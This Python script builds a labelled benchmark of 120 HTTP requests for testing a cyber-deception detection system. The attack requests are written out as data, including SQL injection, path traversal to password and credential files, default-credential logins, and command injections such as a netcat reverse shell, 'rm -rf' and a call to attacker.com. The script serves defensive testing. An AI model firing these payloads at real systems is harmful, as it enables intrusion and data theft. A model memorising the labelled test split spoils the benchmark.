#!/usr/bin/env python3
"""
Scenario Dataset Generator for Stage 9 Benchmark Validation.
Generates a versioned, balanced 120-request benchmark dataset:
  - 60 Development split scenarios (30 Benign, 30 Malicious across 5 attack categories)
  - 60 Held-Out Test split scenarios (30 Benign, 30 Malicious across 5 attack categories)

Attack Categories:
  - SQLI: SQL Injection
  - TRAVERSAL: Path Traversal & LFI
  - CMDI: Command Injection & OS Execution
  - RECON: Reconnaissance & Sensitive Target Probing
  - CRED_STUFF: Credential Stuffing & Auth Brute Force

Ground-truth labels and categories are stored in a dedicated 'ground_truth' sub-object
to ensure strict isolation from request features during evaluation.
"""

import json
import os
import hashlib
from typing import Dict, List, Any

def create_scenario(
    scenario_id: str,
    split: str,
    category: str,
    is_attack: bool,
    method: str,
    path: str,
    headers: Dict[str, str] = None,
    body: str = "",
    client_ip: str = "127.0.0.1",
    auth_failure_count: int = 0,
    request_frequency: float = 1.0,
    decoy_interactions: int = 0,
) -> Dict[str, Any]:
    if headers is None:
        headers = {
            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "host": "localhost:8080",
        }

    return {
        "scenario_id": scenario_id,
        "split": split,
        "session_id": f"sess_{scenario_id.lower().replace('-', '_')}",
        "ground_truth": {
            "label": "MALICIOUS" if is_attack else "BENIGN",
            "is_attack": is_attack,
            "category": category,
            "expected_safety_constraint": "ZERO_ORIGIN_LEAKAGE" if is_attack else "MUST_REACH_ORIGIN",
        },
        "request": {
            "method": method,
            "path": path,
            "headers": headers,
            "body": body,
            "client_ip": client_ip,
        },
        "context_features": {
            "auth_failure_count": auth_failure_count,
            "request_frequency": request_frequency,
            "decoy_interactions": decoy_interactions,
        },
    }

def build_dataset() -> Dict[str, Any]:
    dev_scenarios: List[Dict[str, Any]] = []
    test_scenarios: List[Dict[str, Any]] = []

    # =========================================================================
    # 1. DEVELOPMENT SPLIT (60 samples: 30 Benign, 30 Attacks)
    # =========================================================================

    # 1.1 Dev Benign (30)
    dev_benign_paths = [
        ("GET", "/"),
        ("GET", "/health"),
        ("GET", "/api/health"),
        ("GET", "/favicon.ico"),
        ("GET", "/api/catalog"),
        ("GET", "/api/catalog?category=books"),
        ("GET", "/api/catalog?category=electronics&sort=asc"),
        ("GET", "/api/catalog/items/12"),
        ("GET", "/api/catalog/items/45"),
        ("GET", "/api/catalog/items/99"),
        ("GET", "/api/search?q=laptop"),
        ("GET", "/api/search?q=python+programming"),
        ("GET", "/api/search?q=security+guide&page=2"),
        ("GET", "/api/users/profile"),
        ("GET", "/api/users/settings"),
        ("GET", "/api/cart"),
        ("GET", "/api/cart/items"),
        ("GET", "/api/orders"),
        ("GET", "/api/orders/history?limit=10"),
        ("GET", "/api/orders/status/1029"),
        ("GET", "/assets/index.css"),
        ("GET", "/assets/index.js"),
        ("GET", "/assets/logo.png"),
        ("GET", "/api/help/faq"),
        ("GET", "/api/terms"),
        ("GET", "/api/about"),
        ("GET", "/api/contact"),
        ("GET", "/api/feedback"),
        ("POST", "/api/echo"),
        ("POST", "/api/cart/checkout"),
    ]
    for i, (m, p) in enumerate(dev_benign_paths):
        dev_scenarios.append(create_scenario(
            scenario_id=f"SCN-DEV-BEN-{i+1:03d}",
            split="development",
            category="BENIGN",
            is_attack=False,
            method=m,
            path=p,
            body='{"echo":"test"}' if m == "POST" else "",
            client_ip=f"192.168.1.{10 + (i % 20)}",
            auth_failure_count=0,
            request_frequency=1.2,
        ))

    # 1.2 Dev Attacks (30: 6 SQLi, 6 Traversal, 6 CMDI, 6 Recon, 6 Cred Stuffing)
    dev_sqli = [
        ("GET", "/api/catalog?id=1%27%20OR%20%271%27=%271"),
        ("GET", "/api/items?search=%27%20UNION%20SELECT%20username,%20password%20FROM%20users--"),
        ("POST", "/api/auth/login?user=%27%20OR%20%271%27=%271", '{"username":"admin\' OR \'1\'=\'1","password":"foo"}'),
        ("GET", "/api/products?cat=1;%20DROP%20TABLE%20orders;--"),
        ("GET", "/api/search?query=%27%20OR%201=1--"),

        ("GET", "/api/users?name=admin%27--"),
    ]
    for i, item in enumerate(dev_sqli):
        m, p = item[0], item[1]
        b = item[2] if len(item) > 2 else ""
        dev_scenarios.append(create_scenario(
            scenario_id=f"SCN-DEV-SQLI-{i+1:03d}",
            split="development",
            category="SQLI",
            is_attack=True,
            method=m,
            path=p,
            body=b,
            client_ip="198.51.100.11",
            auth_failure_count=0,
            request_frequency=2.5,
        ))

    dev_traversal = [
        ("GET", "/api/files?path=../../../../etc/passwd"),
        ("GET", "/download?file=..%2F..%2F..%2Fetc%2Fshadow"),
        ("GET", "/api/doc?name=..%5C..%5C..%5Cwindows%5Cwin.ini"),
        ("GET", "/api/static?file=../../../../proc/self/environ"),
        ("GET", "/api/images?path=../../app/config.json"),
        ("GET", "/api/logs?file=../../../var/log/auth.log"),
    ]
    for i, (m, p) in enumerate(dev_traversal):
        dev_scenarios.append(create_scenario(
            scenario_id=f"SCN-DEV-TRAV-{i+1:03d}",
            split="development",
            category="TRAVERSAL",
            is_attack=True,
            method=m,
            path=p,
            client_ip="198.51.100.12",
            auth_failure_count=0,
            request_frequency=3.0,
        ))

    dev_cmdi = [
        ("GET", "/api/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd"),
        ("POST", "/api/exec?cmd=whoami", '{"cmd":"whoami"}'),
        ("GET", "/api/network/lookup?domain=google.com%7Cid"),
        ("GET", "/api/tools/dig?target=8.8.8.8%60id%60"),
        ("GET", "/api/service/status?name=nginx%26%26uname%20-a"),
        ("POST", "/api/admin/shell", '{"command":"id"}'),
    ]
    for i, item in enumerate(dev_cmdi):
        m, p = item[0], item[1]
        b = item[2] if len(item) > 2 else ""
        dev_scenarios.append(create_scenario(
            scenario_id=f"SCN-DEV-CMDI-{i+1:03d}",
            split="development",
            category="CMDI",
            is_attack=True,
            method=m,
            path=p,
            body=b,
            client_ip="198.51.100.13",
            auth_failure_count=0,
            request_frequency=2.0,
        ))

    dev_recon = [
        ("GET", "/.env"),
        ("GET", "/.git/config"),
        ("GET", "/admin/debug"),
        ("GET", "/actuator/env"),
        ("GET", "/server-status"),
        ("GET", "/wp-login.php"),
    ]
    for i, (m, p) in enumerate(dev_recon):
        dev_scenarios.append(create_scenario(
            scenario_id=f"SCN-DEV-RECON-{i+1:03d}",
            split="development",
            category="RECON",
            is_attack=True,
            method=m,
            path=p,
            client_ip="198.51.100.14",
            auth_failure_count=0,
            request_frequency=4.0,
        ))

    dev_cred_stuff = [
        ("POST", "/api/auth/login", '{"username":"admin","password":"password123"}'),
        ("POST", "/api/auth/login", '{"username":"root","password":"toor"}'),
        ("POST", "/api/auth/login", '{"username":"administrator","password":"admin@123"}'),
        ("POST", "/api/auth/login", '{"username":"testuser","password":"123456"}'),
        ("POST", "/api/auth/login", '{"username":"deploy","password":"deploypass"}'),
        ("POST", "/api/auth/login", '{"username":"guest","password":"guestpassword"}'),
    ]
    for i, (m, p, b) in enumerate(dev_cred_stuff):
        dev_scenarios.append(create_scenario(
            scenario_id=f"SCN-DEV-CRED-{i+1:03d}",
            split="development",
            category="CRED_STUFF",
            is_attack=True,
            method=m,
            path=p,
            body=b,
            client_ip="198.51.100.15",
            auth_failure_count=i + 3,
            request_frequency=16.0,
        ))

    # =========================================================================
    # 2. HELD-OUT TEST SPLIT (60 samples: 30 Benign, 30 Attacks)
    # =========================================================================

    # 2.1 Test Benign (30 distinct paths)
    test_benign_paths = [
        ("GET", "/api/v1/healthcheck"),
        ("GET", "/api/v1/ping"),
        ("GET", "/metrics/summary"),
        ("GET", "/status/live"),
        ("GET", "/api/categories/list"),
        ("GET", "/api/catalog/featured"),
        ("GET", "/api/catalog/new-arrivals"),
        ("GET", "/api/catalog/deals"),
        ("GET", "/api/catalog/item/771"),
        ("GET", "/api/catalog/item/882"),
        ("GET", "/api/lookup?item_code=BK-9921"),
        ("GET", "/api/search?q=wireless+headphones"),
        ("GET", "/api/search?q=docker+containers&sort=date"),
        ("GET", "/api/account/billing"),
        ("GET", "/api/account/invoices"),
        ("GET", "/api/account/security-keys"),
        ("GET", "/api/support/tickets/4412"),
        ("GET", "/assets/app.bundle.js"),
        ("GET", "/assets/theme.css"),
        ("GET", "/assets/favicon-32x32.png"),
        ("GET", "/assets/robots.txt"),
        ("GET", "/sitemap.xml"),
        ("GET", "/api/blog/posts/recent"),
        ("GET", "/api/newsletter/status"),
        ("GET", "/api/shipping/estimate?zip=90210"),
        ("GET", "/api/currency/rates?base=USD"),
        ("GET", "/api/profile/avatar.png"),
        ("GET", "/api/preferences/locale"),
        ("POST", "/api/cart/add"),
        ("POST", "/api/support/message"),
    ]
    for i, (m, p) in enumerate(test_benign_paths):
        test_scenarios.append(create_scenario(
            scenario_id=f"SCN-TEST-BEN-{i+1:03d}",
            split="held_out_test",
            category="BENIGN",
            is_attack=False,
            method=m,
            path=p,
            body='{"item_id":12,"qty":1}' if m == "POST" else "",
            client_ip=f"10.0.1.{20 + (i % 20)}",
            auth_failure_count=0,
            request_frequency=1.1,
        ))

    # 2.2 Test Attacks (30: 6 SQLi, 6 Traversal, 6 CMDI, 6 Recon, 6 Cred Stuffing)
    test_sqli = [
        ("GET", "/api/articles?id=10%20AND%201=1"),
        ("GET", "/api/reviews?id=1%27%20AND%20SLEEP(5)--"),
        ("GET", "/api/catalog?order=desc%2C(CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%202%20END)"),
        ("GET", "/api/data?q=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--"),
        ("GET", "/api/filter?val=%27%20HAVING%201=1--"),
        ("GET", "/api/view?item=%22%20OR%20%22%22=%22"),
    ]
    for i, (m, p) in enumerate(test_sqli):
        test_scenarios.append(create_scenario(
            scenario_id=f"SCN-TEST-SQLI-{i+1:03d}",
            split="held_out_test",
            category="SQLI",
            is_attack=True,
            method=m,
            path=p,
            client_ip="203.0.113.21",
            auth_failure_count=0,
            request_frequency=2.8,
        ))

    test_traversal = [
        ("GET", "/view?page=..%2f..%2f..%2fetc%2fhosts"),
        ("GET", "/api/export?filename=..%2F..%2F..%2Froot%2F.bash_history"),
        ("GET", "/api/read?target=../../../../etc/group"),
        ("GET", "/api/attachment?name=..%2F..%2F..%2F..%2Fetc%2Fissue"),
        ("GET", "/api/stream?path=..%2F..%2F..%2Fproc%2Fcpuinfo"),
        ("GET", "/api/render?template=..%2F..%2F..%2Fetc%2Fresolv.conf"),
    ]
    for i, (m, p) in enumerate(test_traversal):
        test_scenarios.append(create_scenario(
            scenario_id=f"SCN-TEST-TRAV-{i+1:03d}",
            split="held_out_test",
            category="TRAVERSAL",
            is_attack=True,
            method=m,
            path=p,
            client_ip="203.0.113.22",
            auth_failure_count=0,
            request_frequency=3.2,
        ))

    test_cmdi = [
        ("GET", "/api/test/curl?url=http://attacker.com%24(id)"),
        ("GET", "/api/convert?format=pdf%3Bsleep%205"),
        ("GET", "/api/dns/check?host=127.0.0.1%7Cnc%20-e%20/bin/sh%2010.0.0.1%204444"),
        ("GET", "/api/system/log?filter=error%7Ccat%20/etc/shadow"),
        ("GET", "/api/backup/run?target=%2Ftmp%2Fbackup%3Brm%20-rf%20%2Ftmp"),
        ("GET", "/api/scan/ip?range=192.168.1.0%2F24%20%7C%20bash"),
    ]
    for i, (m, p) in enumerate(test_cmdi):
        test_scenarios.append(create_scenario(
            scenario_id=f"SCN-TEST-CMDI-{i+1:03d}",
            split="held_out_test",
            category="CMDI",
            is_attack=True,
            method=m,
            path=p,
            client_ip="203.0.113.23",
            auth_failure_count=0,
            request_frequency=2.4,
        ))

    test_recon = [
        ("GET", "/phpmyadmin/index.php"),
        ("GET", "/console/login/LoginForm.jsp"),
        ("GET", "/solr/admin/info/system"),
        ("GET", "/swagger-ui.html"),
        ("GET", "/v2/api-docs"),
        ("GET", "/.aws/credentials"),
    ]
    for i, (m, p) in enumerate(test_recon):
        test_scenarios.append(create_scenario(
            scenario_id=f"SCN-TEST-RECON-{i+1:03d}",
            split="held_out_test",
            category="RECON",
            is_attack=True,
            method=m,
            path=p,
            client_ip="203.0.113.24",
            auth_failure_count=0,
            request_frequency=4.5,
        ))

    test_cred_stuff = [
        ("POST", "/api/v1/auth/token", '{"user":"secops","pass":"secops2026"}'),
        ("POST", "/api/v1/auth/token", '{"user":"sysadmin","pass":"sysadmin1"}'),
        ("POST", "/api/v1/auth/token", '{"user":"oracle","pass":"oracle123"}'),
        ("POST", "/api/v1/auth/token", '{"user":"postgres","pass":"postgres"}'),
        ("POST", "/api/v1/auth/token", '{"user":"manager","pass":"welcome1"}'),
        ("POST", "/api/v1/auth/token", '{"user":"api_user","pass":"secret123"}'),
    ]
    for i, (m, p, b) in enumerate(test_cred_stuff):
        test_scenarios.append(create_scenario(
            scenario_id=f"SCN-TEST-CRED-{i+1:03d}",
            split="held_out_test",
            category="CRED_STUFF",
            is_attack=True,
            method=m,
            path=p,
            body=b,
            client_ip="203.0.113.25",
            auth_failure_count=i + 4,
            request_frequency=18.0,
        ))

    all_scenarios = dev_scenarios + test_scenarios

    # Compute payload digest for integrity validation
    content_str = json.dumps(all_scenarios, sort_keys=True)
    content_hash = hashlib.sha256(content_str.encode("utf-8")).hexdigest()

    dataset_obj = {
        "dataset_version": "1.0.0",
        "dataset_name": "Adaptive Cyber Deception Benchmark Scenarios",
        "description": "Standardized, versioned scenario set for rigorous validation of detection, routing, and DES.",
        "schema_version": "2.0.0",
        "total_scenarios": len(all_scenarios),
        "split_summary": {
            "development_samples": len(dev_scenarios),
            "held_out_test_samples": len(test_scenarios),
        },
        "category_counts": {
            "BENIGN": 60,
            "SQLI": 12,
            "TRAVERSAL": 12,
            "CMDI": 12,
            "RECON": 12,
            "CRED_STUFF": 12,
        },
        "content_sha256": content_hash,
        "scenarios": all_scenarios,
    }

    return dataset_obj

def main():
    dataset = build_dataset()
    out_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "scenarios")
    os.makedirs(out_dir, exist_ok=True)
    out_file = os.path.join(out_dir, "benchmark_scenarios_v1.json")

    with open(out_file, "w") as f:
        json.dump(dataset, f, indent=2)

    print(f"[OK] Generated {dataset['total_scenarios']} benchmark scenarios to: {out_file}")
    print(f"     Content SHA-256: {dataset['content_sha256']}")
    print(f"     Dev Split: {dataset['split_summary']['development_samples']} samples")
    print(f"     Held-Out Test Split: {dataset['split_summary']['held_out_test_samples']} samples")

if __name__ == "__main__":
    main()
